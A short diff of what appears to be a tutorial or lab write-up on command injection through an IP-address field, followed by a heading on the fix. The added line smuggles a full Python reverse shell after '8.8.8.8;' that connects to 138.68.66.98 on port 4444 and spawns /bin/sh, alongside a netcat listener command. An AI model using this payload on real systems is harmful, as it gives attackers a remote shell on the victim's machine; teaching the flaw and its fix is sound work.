@@ -79,7 +79,7 @@ Enter a valid IP
 nc -nlvp 4444
 
 # Run the following in vulnerable app function
-8.8.8.8, 
+8.8.8.8; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("138.68.66.98",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 
 ```
 
 ### The fix
